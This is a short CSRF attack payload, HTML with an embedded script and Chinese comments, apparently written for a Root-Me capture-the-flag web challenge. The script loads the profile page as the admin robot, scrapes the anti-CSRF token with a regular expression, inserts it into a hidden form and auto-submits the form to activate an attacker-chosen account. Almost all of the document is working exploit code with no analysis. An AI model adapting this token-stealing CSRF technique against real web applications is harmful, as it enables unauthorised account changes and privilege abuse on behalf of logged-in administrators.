<form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="exp" />  <!-- 激活账号，根据实际修改  -->
    <input type="hidden" name="status" value="on" />  <!-- 激活动作 -->
    <input id="admin-token" type="hidden" name="token" value="" />  <!-- 网站用于防止 CSRF 的 token，需绕过 -->
</form>
<script>

	// 使用 robot-admin 的身份获取 robot-admin 的 token，用于绕过 CSRF 校验
	var request = new XMLHttpRequest();
	request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
	request.send(null);	
	var respone = request.responseText;
	var groups = respone.match("token\" value=\"(.*?)\"");
	var token = groups[1];
	
	document.getElementById("admin-token").value = token;	// 置换 robot-admin 的 token
	document.csrf.submit();
</script>